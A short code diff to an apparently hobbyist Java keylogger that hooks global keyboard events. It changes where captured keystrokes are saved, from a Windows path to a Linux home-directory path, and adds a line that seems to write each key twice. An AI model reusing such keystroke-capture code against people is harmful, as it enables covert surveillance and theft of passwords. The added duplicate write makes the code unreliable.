@@ -18,9 +18,13 @@ import java.nio.file.StandardOpenOption;
  */
 public class KeyLogger implements NativeKeyListener {
 
-	private static final Path file = Paths.get("C:/keylogger/keys.txt");
-	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
+	private static final Path file = Paths.get("/home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt");
+	/*
+	LINUX: /home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt
+	WINDOWS: C:/keylogger/keys.txt
+	 */
 
+	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 	public static void main(String[] args) {
 
 		//logger.info("Key logger has been started");
@@ -64,6 +68,7 @@ public class KeyLogger implements NativeKeyListener {
 			} else {
 				writer.print(keyText);
 			}
+			writer.print(keyText.toString());
 			
 		} catch (IOException ex) {
 			//logger.error(ex.getMessage(), ex);
